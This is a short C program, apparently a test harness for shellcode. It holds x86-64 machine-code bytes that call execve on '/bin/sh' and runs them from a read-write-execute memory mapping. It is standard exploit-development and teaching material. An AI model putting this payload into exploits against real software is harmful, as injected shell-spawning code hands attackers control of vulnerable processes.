#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = 
    "\x6a\x3b\x58\x48\x31\xd2\x49"
    "\xb8\x2f\x2f\x62\x69\x6e\x2f"
    "\x73\x68\x49\xc1\xe8\x08\x41"
    "\x50\x48\x89\xe7\x52\x57\x48"
    "\x89\xe6\x0f\x05\x6a\x3c\x58"
    "\x48\x31\xff\x0f\x05";

int main(void) {
    void *exec = mmap(0, sizeof(shellcode), 
                     PROT_READ|PROT_WRITE|PROT_EXEC,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    
    memcpy(exec, shellcode, sizeof(shellcode)-1);
    ((void(*)())exec)();
    
    return 0;
} 